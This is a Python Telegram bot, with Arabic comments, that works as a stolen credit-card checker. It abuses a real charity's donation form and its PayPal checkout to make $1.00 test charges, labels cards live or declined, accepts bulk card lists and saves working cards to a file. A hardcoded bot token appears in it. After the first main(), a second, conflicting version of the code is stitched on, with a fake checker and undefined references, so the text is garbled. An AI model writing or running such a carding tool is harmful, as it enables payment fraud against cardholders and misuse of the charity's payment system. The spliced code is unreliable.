import requests
import base64
import re
import time
import os
import sys
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.environ.get('8574162513:AAFuxhjffUh9tP8LzDAnLostStEJV2nOkRA')

if not BOT_TOKEN:
    sys.exit(1)

session = requests.Session()

def check_card(ccx):
    """أحدث إصدار من الفحص"""
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
            
        user = generate_user_agent()
        
        # الخطوة 1: زيارة الموقع
        headers = {'user-agent': user}
        r1 = session.get('https://www.rarediseasesinternational.org/donations/donate/', headers=headers)
        
        # استخراج البيانات
        m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
        m2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
        nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
        
        # استخراج التوكن
        enc = re.search(r'"data-client-token":"(.*?)"', r1.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        
        # الخطوة 2: إنشاء الطلب
        headers2 = {
            'origin': 'https://rarediseasesinternational.org',
            'referer': 'https://www.rarediseasesinternational.org/donations/donate/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data2 = {
            'give-form-id-prefix': m1,
            'give-form-id': m2,
            'give-form-hash': nonec,
            'give-amount': '1.00',
            'payment-mode': 'paypal-commerce',
            'give_first': 'MARWAN',
            'give_last': 'TEST',
            'give_email': 'test@gmail.com',
            'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation',
        }
        
        session.post('https://rarediseasesinternational.org/wp-admin/admin-ajax.php', headers=headers2, data=data2)
        
        # الخطوة 3: إنشاء order
        data3 = MultipartEncoder({
            'give-form-id-prefix': (None, m1),
            'give-form-id': (None, m2),
            'give-form-hash': (None, nonec),
            'give-amount': (None, '1.00'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'MARWAN'),
            'give_last': (None, 'TEST'),
            'give_email': (None, 'test@gmail.com'),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers3 = {
            'content-type': data3.content_type,
            'origin': 'https://rarediseasesinternational.org',
        }
        
        r3 = session.post(
            'https://rarediseasesinternational.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
            headers=headers3,
            data=data3
        )
        
        tok = r3.json()['data']['id']
        
        # الخطوة 4: تأكيد الدفع مع البطاقة
        headers4 = {
            'authorization': f'Bearer {au}',
            'content-type': 'application/json',
        }
        
        json4 = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                }
            }
        }
        
        r4 = session.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
            headers=headers4,
            json=json4
        )
        
        # الخطوة 5: إتمام الطلب
        data5 = MultipartEncoder({
            'give-form-id-prefix': (None, m1),
            'give-form-id': (None, m2),
            'give-form-hash': (None, nonec),
            'give-amount': (None, '1.00'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'MARWAN'),
            'give_last': (None, 'TEST'),
            'give_email': (None, 'test@gmail.com'),
            'give-gateway': (None, 'paypal-commerce'),
        })
        
        headers5 = {
            'content-type': data5.content_type,
            'origin': 'https://rarediseasesinternational.org',
        }
        
        r5 = session.post(
            f'https://rarediseasesinternational.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={tok}',
            headers=headers5,
            data=data5
        )
        
        # تحليل النتيجة
        text = r5.text
        
        if 'true' in text or 'success' in text:
            return "✅ CHARGE - LIVE"
        elif 'INSUFFICIENT_FUNDS' in text:
            return "❌ Insufficient Funds"
        elif 'DO_NOT_HONOR' in text:
            return "❌ Do Not Honor"
        elif 'CVV' in text:
            return "❌ CVV Failed"
        elif 'EXPIRED' in text:
            return "❌ Expired Card"
        elif 'FRAUD' in text:
            return "❌ Suspected Fraud"
        else:
            return "❌ Declined"
            
    except Exception as e:
        return f"❌ Error: {str(e)}"

def validate_card(card):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return False
        if not parts[0].strip().isdigit():
            return False
        return True
    except:
        return False

def hide_card(card):
    try:
        parts = card.split('|')
        num = parts[0]
        if len(num) > 8:
            return num[:6] + "******" + num[-4:] + f"|{parts[1]}|{parts[2]}|{parts[3]}"
        return card
    except:
        return card

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"👋 مرحبا {user.first_name}\n"
        "/check رقم|شهر|سنة|cvv\n"
        "او رفع ملف txt"
    )

async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("اكتب البطاقة")
    
    card = ' '.join(context.args)
    
    if not validate_card(card):
        return await update.message.reply_text("صيغة غلط")
    
    msg = await update.message.reply_text("جاري الفحص...")
    result = check_card(card)
    await msg.edit_text(f"{result}\n{hide_card(card)}")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        return
    
    file = await update.message.document.get_file()
    name = update.message.document.file_name
    
    if not name.endswith('.txt'):
        return await update.message.reply_text("فقط txt")
    
    status = await update.message.reply_text("جاري التحميل...")
    
    try:
        path = f"/tmp/{name}"
        await file.download_to_drive(path)
        
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        os.remove(path)
        
        cards = []
        for line in lines:
            card = line.strip()
            if card and validate_card(card):
                cards.append(card)
        
        if not cards:
            return await status.edit_text("مافيش بطاقات")
        
        await status.edit_text(f"عدد البطاقات: {len(cards)}\nجاري الفحص...")
        
        approved = 0
        for i, card in enumerate(cards):
            result = check_card(card)
            if "CHARGE" in result:
                approved += 1
                with open('live.txt', 'a') as f:
                    f.write(f"{card}\n")
            
            if (i+1) % 5 == 0:
                await status.edit_text(f"تم فحص {i+1}/{len(cards)}...")
        
        await update.message.reply_text(
            f"النتيجة:\n"
            f"المجموع: {len(cards)}\n"
            f"مقبول: {approved}"
        )
        
    except Exception as e:
        await status.edit_text(f"خطأ: {str(e)}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_single))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == "__main__":
    main()    await msg.edit_text(f"{result}\n{hide_card(card)}")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        return
    
    file = await update.message.document.get_file()
    file_name = update.message.document.file_name
    
    if not file_name.endswith('.txt'):
        return await update.message.reply_text("❌ فقط ملفات txt")
    
    status = await update.message.reply_text("📥 جاري التحميل...")
    
    try:
        file_path = f"/tmp/{file_name}"
        await file.download_to_drive(file_path)
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        os.remove(file_path)
        
        cards = []
        for line in lines:
            card = line.strip()
            if card and validate_card(card):
                cards.append(card)
        
        if not cards:
            return await status.edit_text("❌ مفيش بطاقات صحيحة")
        
        await status.edit_text(f"✅ {len(cards)} بطاقة\n🔄 جاري الفحص...")
        
        approved = 0
        for card in cards:
            if "موافقة" in check_card(card):
                approved += 1
        
        await update.message.reply_text(
            f"📊 النتيجة:\n"
            f"المجموع: {len(cards)}\n"
            f"✅ مقبول: {approved}\n"
            f"❌ مرفوض: {len(cards)-approved}"
        )
        
    except Exception as e:
        await status.edit_text(f"❌ خطأ: {str(e)}")

def validate_card(card):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return False
        
        number = parts[0].strip()
        month = parts[1].strip()
        year = parts[2].strip()
        cvv = parts[3].strip()
        
        if not number.isdigit() or len(number) < 15:
            return False
        if not month.isdigit() or int(month) < 1 or int(month) > 12:
            return False
        if not year.isdigit():
            return False
        if not cvv.isdigit() or len(cvv) < 3:
            return False
        
        return True
    except:
        return False

def check_card(card):
    try:
        number = card.split('|')[0].strip()
        time.sleep(0.2)
        
        if number.startswith('4'):
            return "✅ موافقة - فيزا"
        elif number.startswith('5'):
            return "✅ موافقة - ماستركارد"
        else:
            return "❌ مرفوض"
    except:
        return "❌ خطأ"

def hide_card(card):
    try:
        parts = card.split('|')
        number = parts[0]
        if len(number) > 8:
            return number[:6] + "******" + number[-4:] + f"|{parts[1]}|{parts[2]}|{parts[3]}"
        return card
    except:
        return card

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("check", check_single))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == "__main__":
    main()
